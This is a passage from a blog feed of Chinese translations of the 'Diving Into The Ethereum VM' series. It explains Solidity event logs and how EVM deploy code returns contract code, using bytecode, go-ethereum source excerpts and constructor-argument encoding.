ABI 编码为数据，索引参数用作日志主题。</p><p>存储日志数据的 gas 成本比普通存储要便宜得多，因此只要您的合约不需要访问数据，您就可以将其视为 DApp 的替代方案。</p><p>日志设施的两种替代设计选择可能是：</p><ul><li>允许更多数量的主题，尽管更多主题会降低用于按主题索引日志的布隆过滤器的有效性。</li><li>允许主题具有任意数量的字节。为什么不呢？</li></ul><h2 id="Other-Parts"><a href="#Other-Parts" class="headerlink" title="Other Parts"></a>Other Parts</h2><p>‍在这一系列文章中，我翻译了 <a href="https://medium.com/@hayeah">Howard</a> 的 <a href="https://blog.qtum.org/diving-into-the-ethereum-vm-6e8d5d2f3c30">Diving Into The Ethereum VM</a> 系列文章。译文链接如下：</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/">深入以太坊虚拟机 Part5 — 智能合约创建过程</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part6-zh/">深入以太坊虚拟机 Part6 — Solidity 事件实现</a><br>也可以直接看总结篇：</li><li><a href="http://alphafitz.com/2022/10/17/diving-into-the-ethereum-vm-summary">深入以太坊虚拟机 总结</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入以太坊虚拟机-Part6-—-Solidity-事件实现&quot;&gt;&lt;a href=&quot;#深入以太坊虚拟机-Part6-—-Solidity-事件实现&quot; class=&quot;headerlink&quot; title=&quot;深入以太坊虚拟机 Part6 — Solidity 事件实现&quot;&gt;</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊虚拟机" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>深入以太坊虚拟机 Part5 — 智能合约创建过程</title>
    <link href="https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/"/>
    <id>https://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part5-zh/</id>
    <published>2022-10-07T08:39:52.000Z</published>
    <updated>2022-10-17T04:06:20.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入以太坊虚拟机-Part5-—-智能合约创建过程"><a href="#深入以太坊虚拟机-Part5-—-智能合约创建过程" class="headerlink" title="深入以太坊虚拟机 Part5 — 智能合约创建过程"></a>深入以太坊虚拟机 Part5 — 智能合约创建过程</h1><blockquote><p>原文：<a href="https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-5-the-smart-contract-creation-process-cb7b6133b855">Diving Into The Ethereum VM Part 5 — The Smart Contract Creation Process | by Howard | Oct 24, 2017</a></p></blockquote><p>在本系列的前几篇文章中，我们学习了 EVM 汇编的基础知识，以及 ABI 编码如何允许外部世界与合约进行通信。在本文中，我们将了解如何从无到有创建合约。</p><p>本系列的前几篇文章（按顺序）。</p><ul><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part1-zh/">深入以太坊虚拟机 Part1 — 汇编与字节码</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part2-zh/">深入以太坊虚拟机 Part2 — 固定长度数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part3-zh/">深入以太坊虚拟机 Part3 — 动态数据类型的表示</a></li><li><a href="http://alphafitz.com/2022/10/07/diving-into-the-ethereum-vm-part4-zh/">深入以太坊虚拟机 Part4 — 智能合约外部方法调用</a></li></ul><p>到目前为止，我们看到的 EVM 字节码很简单，只是 EVM 从上到下执行的指令，没有魔法。合约创建过程更有趣，因为它模糊了代码和数据之间的界限。</p><p>在学习如何创建合约时，我们会看到有时数据就是代码，有时代码就是数据。</p><p>戴上你最喜欢的巫师帽🎩</p><h2 id="A-Contract’s-Birth-Certificate"><a href="#A-Contract’s-Birth-Certificate" class="headerlink" title="A Contract’s Birth Certificate"></a>A Contract’s Birth Certificate</h2><p>让我们创建一个简单（而且完全没用）的合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// c.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>编译它：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">solc --bin --asm c.sol<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>字节码是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">60606040523415600e57600080fd5b5b603680601c6000396000f30060606040525b600080fd00a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>要创建此合约，我们需要通过对以太坊节点进行 <a href="https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_sendtransaction">eth_sendtransaction</a> RPC 调用来创建交易。您可以使用 Remix 或 Metamask 来执行此操作。</p><p>无论您使用什么部署工具，RPC 调用的参数都类似于：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"from"</span><span class="token operator">:</span> <span class="token string">"0xbd04d16f09506e80d1fd1fd8d0c79afa49bd9976"</span><span class="token punctuation">,</span>  <span class="token property">"to"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>  <span class="token property">"gas"</span><span class="token operator">:</span> <span class="token string">"68653"</span><span class="token punctuation">,</span> <span class="token comment">// 30400,</span>  <span class="token property">"gasPrice"</span><span class="token operator">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token comment">// 10000000000000</span>  <span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"0x60606040523415600e57600080fd5b603580601b6000396000f3006060604052600080fd00a165627a7a723058204bf1accefb2526a5077bcdfeaeb8020162814272245a9741cc2fddd89191af1c0029"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>没有特殊的 RPC 调用或交易类型来创建合约。相同的交易机制也用于其他目的：</p><ul><li>将以太币转移到账户或合约。</li><li>使用参数调用合约的方法。</li></ul><p>根据您指定的参数，以太坊对交易的解释不同。要创建合约，<code>to</code>​ 地址应为空（或省略）。</p><p>我用这个交易创建了示例合约：</p><p><a href="https://rinkeby.etherscan.io/tx/0x58f36e779950a23591aaad9e4c3c3ac105547f942f221471bf6ffce1d40f8401">https://rinkeby.etherscan.io/tx/0x58f36e779950a23591aaad9e4c3c3ac105547f942f221471bf6ffce1d40f8401</a></p><p>打开 Etherscan，您应该看到该交易的输入数据是 Solidity 编译器生成的字节码。</p><p>在处理此交易时，EVM 会将输入数据作为代码执行。<em>Voila</em>，合同诞生了。</p><h2 id="What-The-Bytecode-Is-Doing"><a href="#What-The-Bytecode-Is-Doing" class="headerlink" title="What The Bytecode Is Doing"></a>What The Bytecode Is Doing</h2><p>我们可以将上面的字节码分成三个单独的块：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 部署代码 <span class="token punctuation">(</span>Deploy code<span class="token punctuation">)</span>60606040523415600e57600080fd5b5b603680601c6000396000f300// 合约代码 <span class="token punctuation">(</span>Contract code<span class="token punctuation">)</span>60606040525b600080fd00// 辅助数据 <span class="token punctuation">(</span>Auxdata<span class="token punctuation">)</span>a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><ul><li>部署代码在创建合约时运行。</li><li>合约代码在合约创建后其方法被调用时运行。</li><li>（可选）辅助数据是源代码的加密指纹，用于验证。这只是数据，从未由 EVM 执行。</li></ul><p>部署代码有两个主要目标：</p><ol><li>运行构造函数，并设置初始存储变量（如合约所有者）。</li><li>计算合约代码，并将其返回给 EVM。</li></ol><p>Solidity 编译器生成的部署代码将字节码 <code>60606040525b600080fd00</code>​ 加载到内存中，然后将其作为合约代码返回。在这个例子中，“计算”只是将一大块数据读入内存。原则上，我们可以通过编程方式生成合约代码。</p><p>构造函数的确切作用取决于语言，但任何 EVM 语言都必须在最后返回合约代码。</p><h2 id="Contract-Creation"><a href="#Contract-Creation" class="headerlink" title="Contract Creation"></a>Contract Creation</h2><p>那么在部署代码运行并返回合约代码之后会发生什么。以太坊如何根据返回的合约代码创建合约？</p><p>让我们一起深入研究源代码以了解详细信息。</p><p>我发现 Go-Ethereum 实现是查找所需信息的最简单参考。我们得到正确的变量名、静态类型信息和符号交叉引用。Try beating that, Yellow Paper!</p><p>相关的方法是 <a href="https://sourcegraph.com/github.com/ethereum/go-ethereum@e9295163aa25479e817efee4aac23eaeb7554bba/-/blob/core/vm/evm.go#L301">evm.Create</a>，在 Sourcegraph 上阅读它（当您将鼠标悬停在变量上时会显示类型信息，非常棒）。让我们略读代码，省略一些错误检查和繁琐的细节。从上到下：</p><ul><li>检查调用者是否有足够的余额进行转账：</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> <span class="token operator">!</span>evm<span class="token punctuation">.</span><span class="token function">CanTransfer</span><span class="token punctuation">(</span>evm<span class="token punctuation">.</span>StateDB<span class="token punctuation">,</span> caller<span class="token punctuation">.</span><span class="token function">Address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> common<span class="token punctuation">.</span>Address<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> gas<span class="token punctuation">,</span> ErrInsufficientBalance<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><ul><li>从调用者的地址生成(derive)新合约的地址（传入创建者账户的 <code>nonce</code>​）：</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go">contractAddr <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">CreateAddress</span><span class="token punctuation">(</span>caller<span class="token punctuation">.</span><span class="token function">Address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nonce<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>使用生成的合约地址创建新的合约账户（更改“世界状态 (word state)”StateDB）：</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go">evm<span class="token punctuation">.</span>StateDB<span class="token punctuation">.</span><span class="token function">CreateAccount</span><span class="token punctuation">(</span>contractAddr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>将初始 Ether 捐赠(endowment)从调用者转移到新合约：</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go">evm<span class="token punctuation">.</span><span class="token function">Transfer</span><span class="token punctuation">(</span>evm<span class="token punctuation">.</span>StateDB<span class="token punctuation">,</span> caller<span class="token punctuation">.</span><span class="token function">Address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> contractAddr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>将输入数据设置为合约的部署代码，然后使用 EVM 执行。<code>ret</code>​ 变量是返回的合约代码：</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go">contract <span class="token operator">:=</span> <span class="token function">NewContract</span><span class="token punctuation">(</span>caller<span class="token punctuation">,</span> <span class="token function">AccountRef</span><span class="token punctuation">(</span>contractAddr<span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> gas<span class="token punctuation">)</span>contract<span class="token punctuation">.</span><span class="token function">SetCallCode</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>contractAddr<span class="token punctuation">,</span> crypto<span class="token punctuation">.</span><span class="token function">Keccak256Hash</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>ret<span class="token punctuation">,</span> err <span class="token operator">=</span> <span class="token function">run</span><span class="token punctuation">(</span>evm<span class="token punctuation">,</span> snapshot<span class="token punctuation">,</span> contract<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><ul><li>检查错误。或者如果合约代码太大，则失败。收取用户 gas，然后设置合约代码：</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>maxCodeSizeExceeded <span class="token punctuation">&#123;</span>createDataGas <span class="token operator">:=</span> <span class="token function">uint64</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> params<span class="token punctuation">.</span>CreateDataGas<span class="token keyword">if</span> contract<span class="token punctuation">.</span><span class="token function">UseGas</span><span class="token punctuation">(</span>createDataGas<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>evm<span class="token punctuation">.</span>StateDB<span class="token punctuation">.</span><span class="token function">SetCode</span><span class="token punctuation">(</span>contractAddr<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>err <span class="token operator">=</span> ErrCodeStoreOutOfGas<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Code-That-Deploys-Code"><a href="#Code-That-Deploys-Code" class="headerlink" title="Code That Deploys Code"></a>Code That Deploys Code</h2><p>现在让我们深入了解详细的汇编代码，看看在创建合约时“部署代码”如何返回“合约代码”。同样，我们将分析示例合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约的字节码分成不同的块：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 部署代码 <span class="token punctuation">(</span>Deploy code<span class="token punctuation">)</span>60606040523415600e57600080fd5b5b603680601c6000396000f300// 合约代码 <span class="token punctuation">(</span>Contract code<span class="token punctuation">)</span>60606040525b600080fd00// 辅助数据 <span class="token punctuation">(</span>Auxdata<span class="token punctuation">)</span>a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>部署代码的汇编是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Reserve 0x60 bytes of memory <span class="token keyword">for</span> Solidity internal uses.mstore<span class="token punctuation">(</span>0x40, 0x60<span class="token punctuation">)</span>// Non-payable contract. Revert <span class="token keyword">if</span> <span class="token builtin class-name">caller</span> sent ether.jumpi<span class="token punctuation">(</span>tag_1, iszero<span class="token punctuation">(</span>callvalue<span class="token punctuation">))</span>0x0dup1revert// Copy contract code into memory, and return.tag_1:tag_2:  dataSize<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  dup1  dataOffset<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  0x0  codecopy  0x0  <span class="token builtin class-name">return</span>stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>跟踪上述汇编以返回合约代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// <span class="token number">60</span> <span class="token number">36</span> <span class="token punctuation">(</span>PUSH 0x36<span class="token punctuation">)</span>dataSize<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  stack: <span class="token punctuation">[</span>0x36<span class="token punctuation">]</span>dup1  stack: <span class="token punctuation">[</span>0x36 0x36<span class="token punctuation">]</span>// <span class="token number">60</span> 1c <span class="token operator">==</span> <span class="token punctuation">(</span>PUSH 0x1c<span class="token punctuation">)</span>dataOffset<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>  stack: <span class="token punctuation">[</span>0x1c 0x36 0x36<span class="token punctuation">]</span>0x0  stack: <span class="token punctuation">[</span>0x0 0x1c 0x36 0x36<span class="token punctuation">]</span>codecopy  // Consumes <span class="token number">3</span> arguments  // Copy <span class="token variable"><span class="token variable">`</span>length<span class="token variable">`</span></span> of data from <span class="token variable"><span class="token variable">`</span>codeOffset<span class="token variable">`</span></span> to <span class="token variable"><span class="token variable">`</span>memoryOffset<span class="token variable">`</span></span>  // memoryOffset <span class="token operator">=</span> 0x0  // codeOffset   <span class="token operator">=</span> 0x1c  // length       <span class="token operator">=</span> 0x36  stack: <span class="token punctuation">[</span>0x36<span class="token punctuation">]</span>0x0  stack: <span class="token punctuation">[</span>0x0 0x36<span class="token punctuation">]</span>  memory: <span class="token punctuation">[</span>    0x0:0x36 <span class="token operator">=</span><span class="token operator">></span> calldata<span class="token punctuation">[</span>0x1c:0x36<span class="token punctuation">]</span>  <span class="token punctuation">]</span><span class="token builtin class-name">return</span>  // Consumes <span class="token number">2</span> arguments  // Return <span class="token variable"><span class="token variable">`</span>length<span class="token variable">`</span></span> of data from <span class="token variable"><span class="token variable">`</span>memoryOffset<span class="token variable">`</span></span>  // memoryOffset  <span class="token operator">=</span> 0x0  // length        <span class="token operator">=</span> 0x36  stack: <span class="token punctuation">[</span><span class="token punctuation">]</span>  memory: <span class="token punctuation">[</span>    0x0:0x36 <span class="token operator">=</span><span class="token operator">></span> calldata<span class="token punctuation">[</span>0x1c:0x36<span class="token punctuation">]</span>  <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>dataSize(sub_0)</code>​ 和 <code>dataOffset(sub_0)</code>​ 不是真正的指令。它们实际上是将常量放入堆栈的 PUSH 指令。两个常量 <code>0x1C</code>​ (28) 和 <code>0x36</code>​ (54) 指定一个字节码子串作为合约代码返回。</p><p>部署代码汇编大致对应如下 Python3 代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">memory <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>calldata <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"60606040523415600e57600080fd5b5b603680601c6000396000f30060606040525b600080fd00a165627a7a72305820b5090d937cf89f134d30e54dba87af4247461dd3390acf19d4010d61bfdd983a0029"</span><span class="token punctuation">)</span>size <span class="token operator">=</span> <span class="token number">0x36</span>   <span class="token operator">//</span> dataSize<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">0x1c</span> <span class="token operator">//</span> dataOffset<span class="token punctuation">(</span>sub_0<span class="token punctuation">)</span><span class="token operator">//</span> Copy substring of calldata to memorymemory<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> calldata<span class="token punctuation">[</span>offset<span class="token punctuation">:</span>offset<span class="token operator">+</span>size<span class="token punctuation">]</span><span class="token operator">//</span> Instead of <span class="token keyword">return</span><span class="token punctuation">,</span> <span class="token keyword">print</span> the memory content <span class="token keyword">in</span> <span class="token builtin">hex</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>memory<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>结果内存内容是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">60606040525b600080fd00a165627a7a72305820b5090d937cf89f134d30e54dba87af4247461dd3390acf19d4010d61bfdd983a0029<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>对应于汇编（加上 auxdata）：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 6060604052600080fd00mstore<span class="token punctuation">(</span>0x40, 0x60<span class="token punctuation">)</span>tag_1:  0x0  dup1  revertauxdata: 0xa165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>再次查看 Etherscan，这正是部署为合约代码的内容：<a href="https://rinkeby.etherscan.io/address/0x2c7f561f1fc5c414c48d01e480fdaae2840b8aa2#code">Ethereum Account 0x2c7f561f1fc5c414c48d01e480fdaae2840b8aa2 Info</a></p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUSH1 0x60PUSH1 0x40MSTOREJUMPDESTPUSH1 0x00DUP1REVERTSTOP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="CODECOPY"><a href="#CODECOPY" class="headerlink" title="CODECOPY"></a>CODECOPY</h2><p>部署代码使用 <code>codecopy</code>​ 从交易的输入数据复制到内存。</p><p>与其他更简单的指令相比，<code>codecopy</code>​ 指令的确切行为和参数不那么明显。如果我在黄皮书中查找它，我可能会更加困惑。相反，让我们参考 go-ethereum 源代码，看看它在做什么。</p><p>见 <a href="https://sourcegraph.com/github.com/ethereum/go-ethereum@e9295163aa25479e817efee4aac23eaeb7554bba/-/blob/core/vm/instructions.go#L408:6">CODECOPY</a>：</p><figure><div class="code-wrapper"><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">opCodeCopy</span><span class="token punctuation">(</span>pc <span class="token operator">*</span><span class="token builtin">uint64</span><span class="token punctuation">,</span> evm <span class="token operator">*</span>EVM<span class="token punctuation">,</span> contract <span class="token operator">*</span>Contract<span class="token punctuation">,</span> memory <span class="token operator">*</span>Memory<span class="token punctuation">,</span> stack <span class="token operator">*</span>Stack<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> <span class="token punctuation">(</span>memOffset  <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>codeOffset <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>length     <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>codeCopy <span class="token operator">:=</span> <span class="token function">getDataBig</span><span class="token punctuation">(</span>contract<span class="token punctuation">.</span>Code<span class="token punctuation">,</span> codeOffset<span class="token punctuation">,</span> length<span class="token punctuation">)</span>memory<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span>memOffset<span class="token punctuation">.</span><span class="token function">Uint64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> length<span class="token punctuation">.</span><span class="token function">Uint64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> codeCopy<span class="token punctuation">)</span>evm<span class="token punctuation">.</span>interpreter<span class="token punctuation">.</span>intPool<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>memOffset<span class="token punctuation">,</span> codeOffset<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>没有希腊字母！</p><blockquote><p><code>evm.interpreter.intPool.put(memOffset, codeOffset, length)</code>​ 行回收对象 (big integers) 以供后面使用。这只是一个效率优化。</p></blockquote><h2 id="Constructor-Argument"><a href="#Constructor-Argument" class="headerlink" title="Constructor Argument"></a>Constructor Argument</h2><p>除了返回合约代码外，部署代码的另一个目的是运行构造函数进行设置。如果有构造函数参数，部署代码需要以某种方式从某个地方加载参数数据。</p><p>传递构造函数参数的 Solidity 约定是在调用 <code>eth_sendtransaction</code>​ 时在字节码末尾附加 ABI 编码的参数值。 RPC 调用会将字节码和 ABI 编码参数一起作为输入数据传递，如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"from"</span><span class="token operator">:</span> <span class="token string">"0xbd04d16f09506e80d1fd1fd8d0c79afa49bd9976"</span>  <span class="token property">"data"</span><span class="token operator">:</span> hexencode(compiledByteCode + encodedParams)<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>让我们看一个带有一个构造函数参数的示例合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.11</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">C</span> <span class="token punctuation">&#123;</span><span class="token builtin">uint256</span> a<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">C</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>a <span class="token operator">=</span> _a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>我创建了这个合约，传入值 <code>66</code>​。 Etherscan 上的交易：<a href="https://rinkeby.etherscan.io/tx/0x2f409d2e186883bd3319a8291a345ddbc1c0090f0d2e182a32c9e54b5e3fdbd8">https://rinkeby.etherscan.io/tx/0x2f409d2e186883bd3319a8291a345ddbc1c0090f0d2e182a32c9e54b5e3fdbd8</a></p><p>输入数据为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x60606040523415600e57600080fd5b6040516020806073833981016040528080519060200190919050508060008190555050603580603e6000396000f3006060604052600080fd00a165627a7a7230582062a4d50871818ee0922255f5848ba4c7e4edc9b13c555984b91e7447d3bb0e7400290000000000000000000000000000000000000000000000000000000000000042<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>我们可以在最后看到构造函数参数，即数字 66，但 ABI 编码为 32 字节数字：</p><figure><div class="code-wrapper"><pre 